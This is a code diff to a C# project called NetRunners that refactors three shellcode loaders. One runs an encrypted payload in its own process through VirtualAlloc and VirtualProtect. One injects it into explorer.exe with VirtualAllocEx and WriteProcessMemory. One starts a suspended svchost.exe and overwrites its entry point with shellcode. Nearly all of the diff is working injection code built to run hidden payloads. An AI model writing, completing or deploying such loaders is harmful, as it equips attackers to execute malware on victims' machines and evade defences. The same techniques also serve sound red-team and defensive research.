@@ -17,12 +17,18 @@ namespace NetRunners.Runners
     class Runners
     {
         static byte[] buf = NetRunners.Data.Encrypted.buf;
+        static int sBuf = NetRunners.Data.Encrypted.sBuf;       // decrypted buf size
 
         // Basic Reflective Runner
         public static void Run()
         {
             try
             {
+                // call virtual alloc to allocate memory space here
+                IntPtr pMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_READWRITE);
+                if (pMemory == IntPtr.Zero)
+                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");
+
                 // try to decrypt buf
                 try
                 {
@@ -32,12 +38,6 @@ namespace NetRunners.Runners
                 {
                     throw new InvalidOperationException("Decryption of buffer failed.", e);
                 }
-                int sBuf = buf.Length;
-
-                // call virtual alloc to allocate memory space here
-                IntPtr pMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_READWRITE);
-                if (pMemory == IntPtr.Zero)
-                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");
 
                 // copy shellcode to allocated memory
                 Marshal.Copy(buf, 0, pMemory, sBuf);
@@ -45,8 +45,8 @@ namespace NetRunners.Runners
                 // change memory protection
                 uint oldProtect;
 
-                bool bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_READWRITE, out oldProtect);
-                if (!bVP)
+                int bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_READWRITE, out oldProtect);
+                if (bVP != 1) // not true
                 {
                     throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
                 }
@@ -68,7 +68,7 @@ namespace NetRunners.Runners
         }
 
         // Process Injection Runner
-        public static void piRun()
+        public static void PiRun()
         {
             try
             {
@@ -80,9 +80,14 @@ namespace NetRunners.Runners
 
 
                 // open handle to target process 
-                IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
+                IntPtr hProcess = OpenProcess(0x001F0FFF, 0, explorerPID);
                 if (hProcess == IntPtr.Zero)
                     throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");
+
+                // allocate memory on remote process
+                IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_EXECUTE_READ);
+                if (pRMemory == IntPtr.Zero)
+                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");
 
                 //decrypt buf
                 try
@@ -93,12 +98,6 @@ namespace NetRunners.Runners
                 {
                     throw new InvalidOperationException("Decryption of buffer failed.", e);
                 }
-                int sBuf = buf.Length;
-
-                // allocate memory on remote process
-                IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_EXECUTE_READ);
-                if (pRMemory == IntPtr.Zero)
-                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");
 
                 // write to remote process memory
                 IntPtr outSize;
@@ -120,7 +119,7 @@ namespace NetRunners.Runners
         }
 
         // EntryPoint Stomping Runner (Special Thanks 2 cpu0x00!)
-        public static void epsRun()
+        public static void EpsRun()
         {
             try
             {
@@ -130,8 +129,8 @@ namespace NetRunners.Runners
                 PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
 
                 // create suspended svchost process
-                bool res = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
-                if (res == false)
+                int res = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
+                if (res == 0) // false
                     throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");
 
                 // fetch PEB address using zwqueryinfo
@@ -166,7 +165,6 @@ namespace NetRunners.Runners
                 {
                     throw new InvalidOperationException("Decryption of buffer failed.", e);
                 }
-                int sBuf = buf.Length;
 
                 // write shellcode to memory
                 WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out nRead);
